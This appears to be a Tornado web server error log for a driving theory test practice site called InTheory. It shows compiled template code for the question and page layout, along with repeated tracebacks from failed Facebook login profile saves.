 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
WARNING:root:404 GET /parking.php?domain=intheory.co.uk&keyword=webarchiv (127.0.0.1) 1.20ms
WARNING:root:405 HEAD / (127.0.0.1) 0.69ms
WARNING:root:405 HEAD / (127.0.0.1) 0.68ms
WARNING:root:405 HEAD /login (127.0.0.1) 1.09ms
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
